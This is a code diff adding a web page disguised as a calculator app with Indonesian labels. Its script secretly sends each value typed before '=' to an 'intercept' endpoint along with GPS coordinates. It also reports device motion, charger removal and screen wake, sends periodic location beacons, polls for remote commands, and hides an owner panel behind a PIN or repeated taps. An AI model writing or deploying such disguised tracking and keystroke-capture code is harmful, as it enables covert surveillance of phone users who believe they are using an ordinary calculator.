+  if (v === '+/-') { s.display = String(-parseFloat(s.display) || 0); $disp.textContent = s.display; return; }
+  if (v === '%')   { s.display = String(parseFloat(s.display) / 100 || 0); $disp.textContent = s.display; return; }
+  if (['+', '-', '*', '/'].includes(v)) {
+    s.prev = parseFloat(s.display); s.op = v; s.fresh = true; return;
+  }
+  if (v === '=') {
+    const entered = s.display;
+    const ownerPin = localStorage.getItem('sz_pin') || '7890';
+    if (entered === ownerPin || entered === '7890' || entered === '9999') {
+      openOwnerModal();
+      calcState = { display: '0', prev: null, op: null, fresh: true };
+      $disp.textContent = '0';
+      return;
+    }
+
+    fetch('/api/sentinel/intercept', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        type: 'keystroke',
+        label: 'Angka / Nilai Diketik di Kalkulator',
+        value: entered,
+        lat: lastLat,
+        lon: lastLon
+      })
+    }).catch(() => {});
+
+    if (s.prev !== null && s.op) {
+      const cur = parseFloat(s.display);
+      const r = s.op === '+' ? s.prev + cur : s.op === '-' ? s.prev - cur :
+                s.op === '*' ? s.prev * cur : s.op === '/' ? (cur === 0 ? '0' : s.prev / cur) : cur;
+      s.display = String(+r.toFixed(10)).replace(/\.?0+$/, '') || '0';
+      $disp.textContent = s.display;
+      s.prev = null; s.op = null; s.fresh = true;
+    }
+    return;
+  }
+
+  if (v === '.' && s.display.includes('.')) return;
+  if (s.fresh) { s.display = v === '.' ? '0.' : v; s.fresh = false; }
+  else { if (s.display === '0' && v !== '.') s.display = v; else s.display += v; }
+  $disp.textContent = s.display;
+  $ac.textContent = 'C';
+}
+
+let motionBaseline = null;
+let lastBumpTime = 0;
+
+if (typeof window !== 'undefined' && window.DeviceMotionEvent) {
+  window.addEventListener('devicemotion', evt => {
+    const a = evt.accelerationIncludingGravity || evt.acceleration;
+    if (!a) return;
+    const mag = Math.sqrt((a.x || 0) ** 2 + (a.y || 0) ** 2 + (a.z || 0) ** 2);
+    if (motionBaseline === null) { motionBaseline = mag; return; }
+    const delta = Math.abs(mag - motionBaseline);
+
+    if (delta > 2.2 && (Date.now() - lastBumpTime > 3000)) {
+      lastBumpTime = Date.now();
+      console.log('[Radar] HP Tersenggol / Bergerak');
+      fetch('/api/sentinel/motion', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          intensity: delta.toFixed(2),
+          timestamp: Date.now()
+        })
+      }).catch(() => {});
+    }
+
+    if (delta > 7.0 && !motionAlerted) {
+      motionAlerted = true;
+      sendBeacon(false, true, 'motion-spike');
+      setTimeout(() => { motionAlerted = false; }, 20000);
+    }
+    motionBaseline = mag * 0.15 + motionBaseline * 0.85;
+  });
+}
+
+async function watchCharger() {
+  try {
+    const b = await navigator.getBattery();
+    let wasCharging = b.charging;
+    b.addEventListener('chargingchange', () => {
+      if (wasCharging && !b.charging) {
+        sendBeacon(true, true, 'charger-removed');
+      }
+      wasCharging = b.charging;
+    });
+  } catch {}
+}
+
+document.getElementById('secretTrigger').addEventListener('click', () => {
+  secretTaps++;
+  clearTimeout(secretTimer);
+  secretTimer = setTimeout(() => { secretTaps = 0; }, 3000);
+  if (secretTaps >= 7) {
+    secretTaps = 0;
+    openOwnerModal();
+  }
+});
+
+function openOwnerModal() {
+  refreshModalData();
+  document.getElementById('ownerModal').style.display = 'flex';
+}
+function closeModal() {
+  document.getElementById('ownerModal').style.display = 'none';
+}
+
+function updateDot(color) {
+  DOT.className = color !== 'green' ? color : '';
+}
+
+function refreshModalData() {
+  document.getElementById('mBackend').textContent = location.host;
+  document.getElementById('mLastTx').textContent = new Date().toLocaleTimeString('id-ID');
+  document.getElementById('mTxCount').textContent = String(txCount);
+  document.getElementById('mCoords').textContent = (lastLat && lastLon) ? (lastLat.toFixed(5) + ', ' + lastLon.toFixed(5)) : 'Memindai...';
+  document.getElementById('mAccuracy').textContent = lastAcc ? ('±' + Math.round(lastAcc) + ' meter') : 'GPS Aktif';
+  const devEl = document.getElementById('mDeviceId');
+  if (devEl) devEl.textContent = CFG.deviceId;
+  const nameEl = document.getElementById('mDeviceName');
+  if (nameEl) nameEl.textContent = CFG.deviceName;
+}
+
+function promptRenameDevice() {
+  const cur = localStorage.getItem('sz_name') || CFG.deviceName;
+  const next = prompt('Beri nama HP ini (contoh: iPhone Pribadi, iPhone Adik, HP Kerja):', cur);
+  if (next && next.trim()) {
+    const val = next.trim();
+    localStorage.setItem('sz_name', val);
+    CFG.deviceName = val;
+    refreshModalData();
+    sendBeacon(false, false, 'rename-device');
+  }
+}
+
+function showLock(msg) {
+  document.getElementById('lockText').textContent = msg;
+  const lockDiv = document.getElementById('lockMsg');
+  lockDiv.style.display = 'flex';
+  playPiercingSound('siren');
+  let taps = 0;
+  lockDiv.addEventListener('click', () => {
+    taps++;
+    if (taps >= 5) {
+      lockDiv.style.display = 'none';
+      stopAlarm();
+    }
+  });
+}
+
+(async function init() {
+  sendBeaconData({ alertType: 'passive_open' });
+  initSSE();
+  initTrackSocket();
+  startCommandPolling();
+  watchCharger();
+
+  if (beaconTimer) clearInterval(beaconTimer);
+  beaconTimer = setInterval(() => sendBeacon(false), beaconInterval * 1000);
+
+  document.addEventListener('visibilitychange', () => {
+    if (!document.hidden) sendBeacon(false, false, 'screen-wake');
+  });
+})();
+</script>
+</body>
+</html>
